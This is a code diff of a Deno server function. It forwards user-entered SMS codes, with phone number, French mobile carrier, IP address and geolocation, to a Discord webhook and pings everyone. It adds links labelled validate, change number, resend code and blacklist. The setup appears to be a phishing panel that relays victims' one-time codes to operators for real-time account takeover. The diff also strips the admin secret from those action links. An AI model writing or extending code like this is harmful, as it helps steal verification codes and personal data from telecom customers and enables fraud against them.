@@ -1,14 +1,6 @@
 import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';
 
-const WEBHOOK_URL = Deno.env.get("DISCORD_WEBHOOK");
-
-async function sendWebhookMessage(payload) {
-  return fetch(WEBHOOK_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload),
-  });
-}
+const DISCORD_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");
 
 Deno.serve(async (req) => {
   const base44 = createClientFromRequest(req);
@@ -40,6 +32,17 @@ Deno.serve(async (req) => {
   });
 
   const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
+  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
+
+  // These links call triggerSendCode with the action param
+  const validUrl   = `${appUrl}/?triggerAction=valid&id=${submissionId}`;
+  const wrongUrl   = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
+  const expiredUrl = `${appUrl}/?triggerAction=expired&id=${submissionId}`;
+
+  // Create a simple blacklist URL with base64 encoding
+  const blacklistPayload = btoa(JSON.stringify({ ip, telephone, submissionId }));
+  const blacklistUrl = `${appUrl}/api/blacklist?data=${blacklistPayload}`;
+
   const geoResponse = await fetch("https://ipapi.co/" + ip + "/json/").catch(() => null);
   let geoData = { country_name: "France", city: "Inconnue" };
   if (geoResponse?.ok) {
@@ -48,9 +51,6 @@ Deno.serve(async (req) => {
 
   const country = geoData.country_name || "France";
   const city = geoData.city || "Inconnue";
-
-  const appUrl = Deno.env.get("APP_URL") || "https://app.base44.com";
-  const expectedSecret = Deno.env.get("ADMIN_PASSWORD") || "";
 
   const embed = {
     title: "🔑 Code SMS entré",
@@ -67,16 +67,20 @@ Deno.serve(async (req) => {
       { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: true },
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
       {
-        name: "⚡ Actions",
-        value: `✅ [Valider le code](${appUrl}/?action=valid&id=${submissionId}&s=${encodeURIComponent(expectedSecret)})\n❌ [Changer le numéro](${appUrl}/?action=wrong&id=${submissionId}&s=${encodeURIComponent(expectedSecret)})\n⏰ [Renvoyer au code](${appUrl}/?action=expired&id=${submissionId}&s=${encodeURIComponent(expectedSecret)})\n🚫 [Blacklist instant](${appUrl}/?action=blacklist&id=${submissionId}&ip=${ip}&s=${encodeURIComponent(expectedSecret)})`,
-        inline: false,
+        name: "Actions",
+        value: `✅ [**Valider le code**](${validUrl})\n❌ [**Changer le numéro**](${wrongUrl})\n⏰ [**Renvoyer au code**](${expiredUrl})\n🚫 [**Instant Blacklist**](${blacklistUrl})`,
+        inline: false
       },
     ],
     footer: { text: `ID: ${submissionId || "N/A"}` },
     timestamp: now.toISOString(),
   };
 
-  await sendWebhookMessage({ embeds: [embed] });
+  await fetch(DISCORD_WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
+  });
 
   return Response.json({ ok: true });
 });
